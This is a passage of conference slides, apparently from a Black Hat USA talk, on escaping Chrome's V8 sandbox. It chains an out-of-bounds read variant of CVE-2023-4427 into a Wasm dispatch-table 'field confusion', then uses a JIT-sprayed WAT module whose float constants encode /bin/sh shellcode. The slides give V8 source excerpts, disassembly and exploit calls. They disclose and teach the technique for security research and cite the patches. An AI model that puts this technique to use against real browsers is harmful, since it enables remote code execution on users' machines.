Wasm Module 0
Map
Map
Trusted Ptr Table Index
WasmModuleObject …
Wasm Instance 2
Map Wasm Module 2
Trusted Ptr Table Index Map
WasmModuleObject …
Trusted  Wasm Trusted Instance 1
Pointer Table Wasm Trusted Instance 0  Data
Data
0 Type+Pointer Map
Map
1 Type+Pointer wasm_dispatch_table
wasm_dispatch_table

#BHUSA @BlackHatEvents

86

## Slide 87

### V8 Sandbox Escape – Index Change

### **Address Space** V8 Sandbox

“indirect” Function “indirect” Shared Info “indirect” Function Data
Map Map Map
SharedFunctionInfo WasmExportedFunctionData WasmInternalFunction
… … Wasm Instance 0
Index = 0

#BHUSA @BlackHatEvents

87

## Slide 88

### V8 Sandbox Escape – Index Change

**Address Space** V8 Sandbox

“indirect” Function “indirect” Shared Info “indirect” Function Data
Map Map Map
SharedFunctionInfo WasmExportedFunctionData WasmInternalFunction
… … Wasm Instance 0
Index = N
Using arb read/write

#BHUSA @BlackHatEvents

88

## Slide 89

### V8 Sandbox Escape

###### **Address Space**

### V8 Sandbox

“indirect” Function “indirect” Shared Info “indirect” Function Data
Map Map Map
SharedFunctionInfo WasmExportedFunctionData WasmInternalFunction
… … Wasm Instance 0
Index = N
Wasm Instance 0
Map
Wasm Module 2
Trusted Ptr Table
Index Map
…
WasmModuleObject
Trusted Pointer
Wasm Trusted Instance 0
Table
Data
0 Type+Pointer
Map
1 Type+Pointer
wasm_dispatch_table

#BHUSA @BlackHatEvents

89

## Slide 90

### V8 Sandbox Escape

\```
…
\```

\```
tbl.set(0, indirect);
\```

\```
voidWasmTableObject::SetFunctionTableEntry(Isolate* isolate,
Handle<WasmTableObject> table,
intentry_index,
Handle<Object> entry) {
\```

\```
wasm_instance_1.exports.exploit(1337);
\```

\```
func_index= N
Instance data
of Instance 0
\```

\```
module2->functions[N]
\```

\```
...
Handle<Object> external = WasmInternalFunction::GetOrCreateExternal(
handle(WasmFuncRef::cast(*entry)->internal(isolate), isolate));
if (WasmExportedFunction::IsWasmExportedFunction(*external)) {
autoexported_function= Handle<WasmExportedFunction>::cast(external);
Handle<WasmTrustedInstanceData> target_instance_data(
exported_function->instance()->trusted_data(isolate), isolate);
int func_index= exported_function->function_index();
auto* wasm_function=
&target_instance_data->module()->functions[func_index];
UpdateDispatchTables(isolate, table, entry_index, wasm_function,
target_instance_data);
}
...
}
\```

#BHUSA @BlackHatEvents

90

## Slide 91

###### WASM Internals – Table and Indirect Call

\```
voidWasmTableObject::UpdateDispatchTables(
\```

\```
Instance data
of Instance 0
\```

\```
func= confused
wasmfunction
from module 2
\```

\```
Isolate* isolate, Handle<WasmTableObject> table, intentry_index,
constwasm::WasmFunction* func,
Handle<WasmTrustedInstanceData> target_instance_data) {
...
Address call_target= target_instance_data->GetCallTarget(func->func_index);
...
\```

\```
for(inti= 0, len= uses->length(); i< len; i+= TableUses::kNumElements) {
inttable_index= Smi::cast(uses->get(i+ TableUses::kIndexOffset)).value();
Handle<WasmInstanceObject> instance_object= handle(
WasmInstanceObject::cast(uses->get(i+ TableUses::kInstanceOffset)),
isolate);
\```

\```
...
Tagged<WasmTrustedInstanceData> instance_data=
instance_object->trusted_data(isolate);
instance_data->dispatch_table(table_index)
->Set(entry_index, *call_ref, call_target, sig_id);
}
}
\```

#BHUSA @BlackHatEvents

91

## Slide 92

### V8 Sandbox Escape - Escaping

###### **WASM Instance 0 RWX Memory**

…
0x3e4058452000 jmp 0x3e4058452840
Main Jump
tbl.set(0, indirect); 0x3e4058452005 0x0000000000
Table
0x3e405845200a 0x0000000000
wasm_instance_1.exports.exploit(1337);
… …
0x3e4058452840 push rbp
mov
0x3e4058452841 rbp,rsp
dispatch Null Null … 0x3e4058452844 push 0x8
_table 0x3e4058452846 push rsi
Index 0 1 … 0x3e4058452847 sub rsp,0x10
0x3e405845284e cmp rsp,QWORD PTR [r13-0x60]
0x3e4058452852 jbe 0x3e405845287b Compiled
code
mov
0x3e4058452858 r10d,0x3c75c28f
0x3e405845285e vmovd xmm0,r10d
mov
0x3e4058452863 r10,QWORD PTR [rsi+0x67]
0x3e4058452867 sub DWORD PTR [r10+0x4],0x23
0x3e405845286c js 0x3e4058452886
0x3e4058452872 vmovss xmm1,xmm1,xmm0
…
…

#BHUSA @BlackHatEvents

92

## Slide 93

### V8 Sandbox Escape - Escaping

###### **WASM Instance 0 RWX Memory**

…
0x3e4058452000 jmp 0x3e4058452840
Main Jump
tbl.set(0, indirect); 0x3e4058452005 0x0000000000
Table
0x3e405845200a 0x0000000000
wasm_instance_1.exports.exploit(1337);
… …
0x3e4058452840 push rbp
mov
0x3e4058452841 rbp,rsp
dispatch callTarget=jmp_table_start+N Null … 0x3e4058452844 push 0x8
_table 0x3e4058452846 push rsi
Index 0 1 … 0x3e4058452847 sub rsp,0x10
0x3e405845284e cmp rsp,QWORD PTR [r13-0x60]
0x3e4058452852 jbe 0x3e405845287b Compiled
code
mov
0x3e4058452858 r10d,0x3c75c28f
0x3e405845285e vmovd xmm0,r10d
mov
0x3e4058452863 r10,QWORD PTR [rsi+0x67]
0x3e4058452867 sub DWORD PTR [r10+0x4],0x23
0x3e405845286c js 0x3e4058452886
0x3e4058452872 vmovss xmm1,xmm1,xmm0
…
…

#BHUSA @BlackHatEvents

93

## Slide 94

### V8 Sandbox Escape - Escaping

###### **WASM Instance 0 RWX Memory**

…
0x3e4058452000 jmp 0x3e4058452840
tbl.set(0, indirect); 0x3e4058452005 0x0000000000
0x3e405845200a 0x0000000000
wasm_instance_1.exports.exploit(1337);
… …
0x3e4058452840 push rbp
Access
mov
0x3e4058452841 rbp,rsp
dispatch callTarget=jmp_table_start+N Null … 0x3e4058452844 push 0x8
_table 0x3e4058452846 push rsi
Index 0 1 … 0x3e4058452847 sub rsp,0x10
0x3e405845284e cmp rsp,QWORD PTR [r13-0x60]
0x3e4058452852 jbe 0x3e405845287b
mov
0x3e4058452858 r10d,0x3c75c28f
0x3e405845285e vmovd xmm0,r10d
mov
jump 0x3e4058452863 r10,QWORD PTR [rsi+0x67]
Control Flow  0x3e4058452867 sub DWORD PTR [r10+0x4],0x23
0x3e405845286c js 0x3e4058452886
Hijacking
0x3e4058452872 vmovss xmm1,xmm1,xmm0
primitive … …
jmp_table_star t+N

Main Jump Table Compiled code

#BHUSA @BlackHatEvents

94

## Slide 95

### V8 Sandbox Escape – Code Execution

Control Flow Hijacking primitive

Code Execution

###### WAT Code

64bit ASM

\```
(func(export "spray") (result f64)
f64.const1.63052427775809e-270
f64.const1.6181477236817195e-270
f64.const1.6177848829038078e-270
f64.const1.630523884017562e-270
…
)
\```

Liftoff
…
Compiler

\```
…
movabsr10,0x7eb909090909090
vmovqxmm0,r10
movabsr10,0x7eb5b0068732f68
vmovqxmm1,r10
movabsr10,0x7eb596e69622f68
vmovqxmm2,r10
movabsr10,0x7eb909020e3c148
vmovqxmm3,r
…
\```

#BHUSA @BlackHatEvents

95

## Slide 96

### V8 Sandbox Escape - Code Execution

###### WASM Module 0

###### **WASM Instance 0 RWX Memory**

|`(module`
`(func (export"spray") (result f64)`
`f64.const 1.63052427775809e-270`
`f64.const 1.6181477236817195e-270`
`f64.const 1.6177848829038078e-270`|0x3e4058452000
0x3e4058452005
0x3e405845200a
…|jmp 0x3e4058452840
jmp 0x3e405845280a
0x0000000000
…|Main Jump
Table|
|---|---|---|---|
|`f64.const 1.630523884017562e-270`
`f64.const 1.6305240634909753e-270`
`f64.const 1.6175077909294658e-270`
`f64.const 1.6456885606567564e-270`
`f64.const 1.6305242777505848e-270`
`drop`
`drop`
`drop`
`drop`
|0x3e4058452840
0x3e4058452841
0x3e4058452844
0x3e4058452846
0x3e4058452847
0x3e405845284e
0x3e4058452852|pushrbp
movrbp,rsp
push0x8
pushrsi
subrsp,0x10
cmp
rsp,QWORD PTR [r13-0x60]
jbe
0x379ded7718ea|Compiled
|
|`drop`
`drop`
`drop`
`)`|0x3e4058452858
0x3e4058452862
0x3e4058452867|movabs r10,0x7eb909090909090
vmovq
xmm0,r10
movabs r10,0x7eb5b0068732f68|code|
|`(func $indirect (result f32)`
`f32.const 0.015`
`)`
`(export"indirect" (func $indirect))`
`)`|0x3e4058452871
0x3e4058452876
0x3e4058452880
…|vmovq
xmm1,r10
movabs r10,0x7eb596e69622f68
vmovq
xmm2,r10
…||

#BHUSA @BlackHatEvents

96

## Slide 97

### V8 Sandbox Escape - Code Execution

###### **WASM Instance 0 RWX Memory**

\```
…
\```

tbl.set(0, indirect); 0x3e4058452000 jmp 0x3e4058452840
Main Jump
0x3e4058452005 jmp 0x3e405845280a
Table
wasm_instance_1.exports.exploit(1337); 0x3e405845200a 0x0000000000
… …
… …
0x3e405845285b nop
Control
0x3e405845285c nop
Flow
0x3e405845285d nop
Hijacking  Jump to  0x3e405845285e nop
primitive shellcode 0x3e405845285f nop
0x3e4058452860 jmp 0x3e4058452869 Compiled
code
… …
0x3e4058452869 push   0x68732f “/sh”
0x3e405845286e pop    rbx
0x3e405845286f jmp 0x3e4058452878
… …
0x3e4058452878 push   0x6e69622f “/bin”
0x3e405845287d pop    rcx
… …

#BHUSA @BlackHatEvents

97

## Slide 98

### Putting It All Together

- `A OOB read vulnerability - a variant of CVE-2023-4427`

- `From a OOB read vulnerability to the fakeobj primitive by controlling the offset of the OOB read and using some advanced heap manipulation techniques`

- `From the fakeobj primitive to more powerful exploit primitives: addrof, arbitrary read, arbitrary write – elegantly solving the exploit stability issues`

- `Use those exploit primitives for “field confusion” and hijack WASM call target address to jump into a controlled offset of the WASM RWX memory to execute the shellcode directly outside the V8 sandbox`

- `Fit both Chrome and Chromium based MSEdge for a double tap`

#BHUSA @BlackHatEvents

98

## Slide 99

### Demo

#BHUSA @BlackHatEvents

99

## Slide 100

### Summary & Takeaways

- `History doesn’t repeat itself, but it rhymes`

   - `Bugs are the same, how to (effectively and efficiently) predict and discover the rhyming word worth more explorations`

- `A great exploit is an art`

   - `The exploitation ideas and techniques are universal and can be applied to other (similar) vulnerability exploitations`

   - `Exploring the big gap between a working exploit and a close to 100% success rate exploit is a necessary way to be a master`

- `“Field confusion” inside the V8 sandbox would` ~~`possibly`~~ `lead the way to a new V8 sandbox escape era`

- `Think about the defense for above all like an exploiter`

#BHUSA @BlackHatEvents

100

## Slide 101

# Q & A

#BHUSA @BlackHatEvents

## Slide 102

### References

\```
[1] OffensiveCon24 -Samuel Groß-The V8 Heap Sandbox
https://youtu.be/5otAw81AHQ0?si=fFzTt8W4lSNggAC4
\```

\```
[2] Fast For-In in V8 -Camillo Brunihttps://v8.dev/blog/fast-for-in
[3] Maps (Hidden Classes) in V8https://v8.dev/docs/hidden-classes
[4] CVE-2023-4427 -Sergei Glazunovhttps://bugs.chromium.org/p/project-
zero/issues/detail?id=2477
\```

\```
[5] Patch CVE-2023-4427:
\```

\```
https://chromium-review.googlesource.com/c/v8/v8/+/4771019
[6] Patch CVE-2023-3159:
\```

\```
https://chromium-review.googlesource.com/c/v8/v8/+/5388435/3/src/objects/map-
updater.cc#b1051
\```

- `[7] Patch V8 Sandbox Escape:`

- <u>`https://chromium-review.googlesource.com/c/v8/v8/+/5401857/2/src/wasm/wasmobjects.cc#b293`</u>

- <u>`https://chromium-review.googlesource.com/c/v8/v8/+/5484107`</u>

#BHUSA @BlackHatEvents

102
